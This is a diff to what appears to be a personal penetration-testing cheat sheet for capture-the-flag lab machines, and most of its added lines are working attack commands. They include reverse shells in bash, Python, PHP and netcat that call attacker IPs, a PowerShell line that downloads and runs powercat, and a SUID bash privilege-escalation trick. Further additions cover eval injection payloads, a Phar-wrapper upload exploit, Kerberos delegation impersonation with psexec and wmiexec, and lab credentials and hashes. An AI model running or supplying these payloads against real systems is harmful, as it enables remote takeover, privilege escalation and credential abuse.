@@ -14,6 +14,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [awk](#awk)
   - [samrdump](#samrdump)
   - [tar](#tar)
   - [proof.txt](#proof.txt)
@@ -164,20 +165,66 @@ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/192.168.45.176/80 0>&1"' | base64
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 
-# python reverse shell
+# this copies /bin/bash with SUID privilege! pretty useful(must be run with -p option so keep the privilege)
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
+/tmp/0xdf -p
+
+++++++++++++++++ Python reverse shell ++++++++++++++++++++++++++++++++++++++++++++
+
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-# when escaping double quotes
+
+# When escaping double quotes
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
-# when using os
+
+# When using os
 os.system('nc 192.168.45.175 80 -e /bin/sh')
 
-#netcat reverse shell
+# When putting directly to input or inside of eval
+__import__('os').system('bash')
+' + __import__('os').popen('id').read() + '
+
+# netcat reverse shell
 nc -e /bin/sh 192.168.45.176 80
 
-#PHP reverse shell
+++++++++++++++++ PHP reverse shell ++++++++++++++++++++++++++++++++++++++++++++
+# PHP reverse shell
 php -r '$sock=fsockopen("192.168.45.176",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+# When we want to know what we should use
+<?php phpinfo(); ?>
+
+# PHP proc_open reverse shell
+<?php
+        $descspec = array(
+                0 => array("pipe", "r"),
+                1 => array("pipe", "w"),
+                2 => array("pipe", "w")
+        );
+        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.19/443 0>&1'";
+        $proc = proc_open($cmd, $descspec, $pipes);
+?>
+
+# Convert PHP file to Phar #################################################
+0. get your reverse shell ready(example is using the one avobe - proc_open_rev.php)
+
+1. test.php file(when we convert this, it will create an archive named "shell.phar"
+<?php
+$phar = new Phar('shell.phar'); 
+$phar->startBuffering();
+$phar->addFile('./proc_open_rev.php', 'proc.php');        // first create proc_open_rev.php reverse shell and then give it a name proc
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering(); ?>
+
+2. convert php file
+php --define phar.readonly=0 test.php
+
+3. When you call phar file with phar wrapper
+http://dev.siteisup.htb/?page=phar://uploads/ac5052094c12a761f080438aeb6c9634/proc.jpg/proc
+
+++++++++++++++++++++++++++++++++++++++++++++ powershell ++++++++++++++++++++++++++++++++++++++++++++
 
 # Powershell: w powercat
 IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.45.176/powercat.ps1");powercat -c 192.168.45.176 -p 4444 -e powershell
@@ -352,6 +399,7 @@ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
 # mysql login
 mysql -u 'root' -h 192.168.183.122 -p
 mysql -u 'root' -h 192.168.183.122 -pPassword
+mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea(dbname)
 
 # Creating a database
 CREATE DATABASE users;
@@ -649,6 +697,13 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+### awk
+```bash
+echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
+hello there
+```
+
+
 ### samrdump
 samrdump.py 10.129.14.128
 
@@ -932,11 +987,12 @@ cewl http://10.129.200.170/nibbleblog/
 
 ### sudo
 ```bash
-#switch to root user
+# Switch to root user
 sudo su -
 
-# run command as lamster
+# Run command as lamster
 sudo -u lamster /bin/echo Hello World!
+sudo -i -u scriptmanager
 
 ```
 
@@ -1073,7 +1129,7 @@ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u ht
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://94.237.49.166:43190/blog/FUZZ.php
 
 # Recursion
-ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php,.git -v
 
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://faculty.academy.htb:43458/courses/FUZZ -e .php,.php7,.phps -v -fs 287,0 -recursion -recursion-depth 1
 
@@ -1266,10 +1322,36 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
+**constrained delegation**
+```bash
+┌──(root㉿kali)-[~/tools/gMSADumper]
+└─# impacket-getST -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator -hashes :5ecbb8825fa84b3154a7f12336795ed4 'intelligence.htb/SVC_INT$'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+```
+
+**psexec**
+```bash
+# authenticate with ticket
+KRB5CCNAME=administrator.ccache psexec.py -k -no-pass administrator@dc.intelligence.htb 
+```
+
+**wmiexec**
+```bash
+KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
+```
+
 ### LDAPSearch focus on samaccount and description
 ```bash
 # unauthenticated
 ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec' -s base namingcontexts
+ldapsearch -x -H ldap://10.10.10.248 -D 'intelligence\Tiffany.Molina' -w 'NewIntelligenceCorpUser9876' -b "DC=intelligence,DC=htb" -s sub "(&(objectclass=user))"
 ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec' > ldap_search.txt
 --> If we get the results
   # cat ldap_search.txt | grep -i "samaccountname" > raw_users.txt
@@ -1418,7 +1500,7 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\TEMP\
 
 ### bloodhound-python
 ```bash
-bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
+bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns 10.10.10.161
 
 ```
 
